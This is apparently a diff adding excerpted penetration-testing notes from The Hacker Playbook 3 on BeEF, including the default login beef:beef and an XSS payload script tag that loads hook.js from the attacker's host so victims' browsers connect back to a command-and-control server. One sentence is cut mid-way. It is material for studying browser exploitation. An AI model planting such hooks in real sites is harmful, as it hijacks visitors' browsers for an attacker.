@@ -1,0 +1,10 @@
+Start BeEF on Your Attacker Kali Host From a Terminal  beef-xss  Authenticate with beef:beef  
+View http://127.0.0.1:3000/hook.js  Full Payload Hook File:  <script src="http://<Your IP>:3000/hook.js"></script>  
+Viewing your hook.js file located on http://127.0.0.1:3000/hook.js, you should see something that resembles a 
+long-obfuscated JavaScript file.  This is the client payload to connect your victim back to the command and control server.  
+Once you have identified an XSS on your target application, instead of the original alert(1) style payload, 
+you would modify the <script src="http://<Your IP>:3000/hook.js"></script> payload to exploit the vulnerability.
+this XSS trap, it will cause their browser to connect back to you and be a part of your Zombie network.
+
+
+Kim, Peter. The Hacker Playbook 3: Practical Guide To Penetration Testing (pp. 56-57). Secure Planet. Kindle Edition. 
